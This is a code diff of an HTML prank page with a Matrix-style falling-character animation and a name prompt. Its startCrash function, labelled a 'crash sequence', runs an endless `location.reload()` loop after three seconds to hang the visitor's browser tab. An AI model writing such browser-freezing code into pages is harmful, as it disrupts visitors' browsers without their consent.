@@ -34,6 +34,7 @@
             border: 2px solid #00ff00;
             color: #00ff00;
             text-shadow: 0 0 5px #00ff00;
+            margin-top: 10px;
         }
 
         input {
@@ -52,19 +53,18 @@
         }
 
         /* Matrix Falling Code Effect */
-        .matrix {
+        canvas {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            pointer-events: none;
             z-index: -1;
         }
     </style>
 </head>
 <body>
-    <canvas class="matrix"></canvas>
+    <canvas id="matrixCanvas"></canvas>
 
     <h1>Welcome to the System</h1>
     <p>What is your name, good boy? 🟩</p>
@@ -78,7 +78,7 @@
 
     <script>
         function startCrash() {
-            let name = document.getElementById("nameInput").value || "User";
+            let name = document.getElementById("nameInput").value.trim() || "User";
             document.getElementById("userName").innerText = name;
             document.getElementById("message").classList.remove("hidden");
 
@@ -87,26 +87,26 @@
             document.querySelector("button").style.display = "none";
 
             // Start the crash sequence
-            setTimeout(function(){
+            setTimeout(() => {
                 while (true) {
-                    location.reload(1);
+                    location.reload();
                 }
             }, 3000);
         }
 
-        // Matrix Rain Effect
-        const canvas = document.querySelector(".matrix");
+        // Matrix Effect
+        const canvas = document.getElementById("matrixCanvas");
         const ctx = canvas.getContext("2d");
 
         canvas.width = window.innerWidth;
         canvas.height = window.innerHeight;
 
-        const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ123456789@#$%^&*()*&^%";
+        const letters = "01XOX1XOX10XOX1XOX10XOX1XOX10XOX1XOX1";
         const matrix = letters.split("");
 
         const fontSize = 16;
         const columns = canvas.width / fontSize;
-        const drops = Array(Math.floor(columns)).fill(1);
+        const drops = Array.from({ length: Math.floor(columns) }).fill(1);
 
         function drawMatrix() {
             ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
